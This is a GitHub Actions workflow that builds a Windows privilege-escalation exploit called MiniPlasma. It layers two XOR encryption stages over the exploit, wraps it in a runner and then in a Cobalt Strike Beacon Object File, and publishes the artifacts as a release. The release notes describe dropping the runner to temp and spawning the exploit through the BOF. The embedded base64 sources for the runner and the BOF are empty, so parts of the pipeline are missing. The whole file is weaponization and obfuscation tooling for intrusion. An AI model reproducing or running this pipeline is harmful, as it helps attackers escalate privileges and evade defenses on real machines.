name: Build MiniPlasma
on:
  workflow_dispatch:
  push:
    branches: [main]
    paths: ['.github/workflows/build-miniplasma.yml']
permissions:
  contents: write
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup MSBuild
        uses: microsoft/setup-msbuild@v2

      - name: Restore NuGet packages
        shell: pwsh
        run: |
          Remove-Item -Recurse -Force MiniPlasma\packages -ErrorAction SilentlyContinue
          nuget restore MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln -PackagesDirectory MiniPlasma\packages

      - name: Patch Stage0 (MP_EXE env var for child process path)
        shell: pwsh
        run: |
          $src = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\Program.cs"
          $txt = [IO.File]::ReadAllText($src)
          $patched = $txt.Replace(
              'typeof(Program).Assembly.Location',
              'System.Environment.GetEnvironmentVariable("MP_EXE") ?? typeof(Program).Assembly.Location')
          [IO.File]::WriteAllText($src, $patched, [Text.Encoding]::UTF8)
          if ($patched -ne $txt) { Write-Output "Patched Stage0" } else { Write-Warning "Pattern not found" }

      - name: Build inner EXE (full exploit, Costura single-file)
        run: >
          msbuild MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP.sln
          /p:Configuration=Release /p:Platform="Any CPU"
          /p:SignManifests=false /p:Optimize=true

      # ── XOR-encrypt inner EXE + build self-contained Runner EXE ──────────────
      - name: XOR-encrypt inner EXE and build Runner EXE
        shell: pwsh
        run: |
          $innerExe = "MiniPlasma\PoC_AbortHydration_ArbitraryRegKey_EoP\bin\Release\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
          $wrDir = "$env:TEMP\build_runner"
          New-Item -ItemType Directory -Force $wrDir | Out-Null

          $bytes = [IO.File]::ReadAllBytes($innerExe)
          $key = Get-Random -Minimum 1 -Maximum 255
          for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }
          [IO.File]::WriteAllBytes("$wrDir\payload.enc", $bytes)
          Write-Output "Inner EXE encrypted: $($bytes.Length) bytes  key=$key"

          $runnerB64 = ""
          $runnerSrc = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($runnerB64))
          $runnerSrc = $runnerSrc.Replace("XORKEY_VALUE", $key.ToString())
          [IO.File]::WriteAllText("$wrDir\Runner.cs", $runnerSrc, [Text.Encoding]::UTF8)

          $csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
          $runnerExe = "$wrDir\runner.exe"
          & $csc /nologo /optimize /target:exe /out:$runnerExe `
              "/res:$wrDir\payload.enc,PoC_AbortHydration_ArbitraryRegKey_EoP.payload.enc" `
              "$wrDir\Runner.cs"
          if ($LASTEXITCODE -ne 0) { throw "Runner.exe build failed" }
          Write-Output "Runner.exe: $((Get-Item $runnerExe).Length) bytes"
          Write-Output "RUNNER_EXE=$runnerExe" >> $env:GITHUB_ENV

      # ── XOR-encrypt runner + generate bof.c + compile BOF ────────────────────
      - name: Generate and compile BOF
        shell: pwsh
        run: |
          $runnerExe = $env:RUNNER_EXE
          $bofDir = "$env:TEMP\bof_build"
          New-Item -ItemType Directory -Force $bofDir | Out-Null

          $rBytes = [IO.File]::ReadAllBytes($runnerExe)
          $key2 = Get-Random -Minimum 1 -Maximum 255
          for ($i = 0; $i -lt $rBytes.Length; $i++) { $rBytes[$i] = $rBytes[$i] -bxor $key2 }
          $hexBytes = [System.BitConverter]::ToString($rBytes).Replace('-', ',0x').Insert(0, '0x')
          Write-Output "Runner encrypted: $($rBytes.Length) bytes  key2=$key2"

          $bofB64 = ""
          $bofSrc = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($bofB64))
          $bofSrc = $bofSrc.Replace("PLACEHOLDER_BYTES", $hexBytes)
          $bofSrc = $bofSrc.Replace("PLACEHOLDER_LEN",  $rBytes.Length.ToString())
          $bofSrc = $bofSrc.Replace("PLACEHOLDER_KEY",  $key2.ToString())
          [IO.File]::WriteAllText("$bofDir\bof.c", $bofSrc, [Text.Encoding]::UTF8)
          Write-Output "bof.c: $((Get-Item "$bofDir\bof.c").Length) bytes"

          $cl = Get-ChildItem "C:\Program Files\Microsoft Visual Studio" `
              -Recurse -Filter "cl.exe" -ErrorAction SilentlyContinue |
              Where-Object { $_.FullName -match "Hostx64\\x64" } |
              Select-Object -First 1 -ExpandProperty FullName
          if (-not $cl) { throw "cl.exe not found" }
          Write-Output "Compiler: $cl"

          $bofObj = "$bofDir\miniplasma.o"
          & $cl /c /GS- /W0 /nologo /O2 "$bofDir\bof.c" "/Fo$bofObj"
          if ($LASTEXITCODE -ne 0) { throw "BOF compile failed" }
          Write-Output "BOF object: $((Get-Item $bofObj).Length) bytes"
          Write-Output "BOF_OBJ=$bofObj" >> $env:GITHUB_ENV

      - name: Stage artifacts
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force staging | Out-Null
          Copy-Item $env:BOF_OBJ  "staging\miniplasma.o"
          Copy-Item $env:RUNNER_EXE "staging\PoC_AbortHydration_ArbitraryRegKey_EoP.exe"
          Get-ChildItem staging\ | Format-Table Name, Length

      - name: Create GitHub Release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        shell: pwsh
        run: |
          $tag = "v6.0-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
          gh release create $tag staging\* `
            --title "MiniPlasma v6.0 - Cobalt Strike BOF" `
            --notes "miniplasma.o: CS BOF - drops self-contained runner to temp, spawns exploit. Usage: inline-execute miniplasma.o. EXE: standalone runner for direct testing." `
            --repo $env:GITHUB_REPOSITORY
          Write-Output "Release: $tag"
